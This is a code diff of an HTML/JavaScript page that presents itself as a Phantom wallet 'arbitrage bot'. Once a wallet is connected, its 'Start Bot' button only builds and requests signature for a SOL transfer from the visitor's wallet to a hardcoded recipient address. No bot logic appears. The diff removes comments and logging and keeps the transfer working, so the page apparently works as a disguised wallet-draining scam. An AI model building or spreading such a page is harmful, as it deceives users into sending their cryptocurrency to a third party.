@@ -3,16 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Arbitrage Bot with Phantom Wallet</title>
+    <title>Phantom Wallet Bot</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f4f4f4;
             padding: 20px;
-        }
-        h1 {
-            text-align: center;
-            color: #333;
         }
         #app {
             width: 80%;
@@ -58,42 +54,33 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.37.1/solana-web3.min.js"></script>
 <script>
     let userAccount;
-    const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";  // Solana recipient address
+    const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
     const phantomDeepLink = "https://phantom.app/ul/v1/connect?app_url=YOUR_APP_URL";
 
-    // Check if the user is on mobile
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
-    // Function to connect to Phantom Wallet
     async function connectPhantomWallet() {
         if (window.solana && window.solana.isPhantom) {
             try {
-                console.log("Attempting to connect Phantom wallet...");
                 const response = await window.solana.connect();
                 userAccount = response.publicKey.toString();
                 document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
                 document.getElementById("startBotButton").disabled = false;
                 document.getElementById("status").innerText = "Wallet connected successfully.";
-                console.log("Wallet connected with address:", userAccount);
             } catch (error) {
                 console.error("Error connecting to Phantom:", error);
                 alert("Error connecting to Phantom: " + error.message);
             }
         } else if (isMobile) {
-            // Redirect to Phantom app using deep link if on mobile
             window.location.href = phantomDeepLink;
         } else {
-            alert("Phantom Wallet not found. Please install the Phantom Wallet extension on desktop or use the Phantom app on mobile.");
+            alert("Phantom Wallet not found. Please install the Phantom Wallet extension or use the app.");
         }
     }
 
-    // Attach event listener to the "Connect Phantom Wallet" button
     document.getElementById("connectButton").addEventListener("click", connectPhantomWallet);
 
-    // Function to send SOL to the recipient address
     async function sendSolanaTokens() {
-        document.getElementById("status").innerText = "Preparing transaction...";
-
         if (!userAccount) {
             document.getElementById("status").innerText = "Please connect your wallet first.";
             return;
@@ -103,44 +90,29 @@
         const transaction = new solanaWeb3.Transaction();
 
         try {
-            // Create a SOL transfer instruction
-            console.log("Creating transfer instruction...");
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(userAccount),
                     toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: 1000000 // Adjust the amount in lamports (1 SOL = 1e9 lamports)
+                    lamports: 1000000
                 })
             );
 
             document.getElementById("status").innerText = "Requesting signature...";
-            console.log("Requesting transaction signature from Phantom wallet...");
-
-            // Request signature and send transaction
-            const { signature } = await window.solana.signAndSendTransaction(transaction);
-            console.log("Transaction signature:", signature);
-
-            // Confirm transaction
+            const signedTransaction = await window.solana.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             await connection.confirmTransaction(signature, 'confirmed');
-
             document.getElementById("status").innerText = `Transaction successful: ${signature}`;
-            console.log("Transaction successful:", signature);
         } catch (error) {
-            console.error("Transaction failed:", error);
+            console.error("Transaction error:", error);
             document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
         }
     }
 
-    // Attach event listener to the "Start Bot" button
     document.getElementById("startBotButton").addEventListener("click", async () => {
-        console.log("Start Bot button clicked. Sending transaction...");
-        // Update button text to show loading state
         document.getElementById("startBotButton").innerText = "Processing...";
         document.getElementById("startBotButton").disabled = true;
-
         await sendSolanaTokens();
-
-        // Reset button text and re-enable after transaction attempt
         document.getElementById("startBotButton").innerText = "Start Bot";
         document.getElementById("startBotButton").disabled = false;
     });
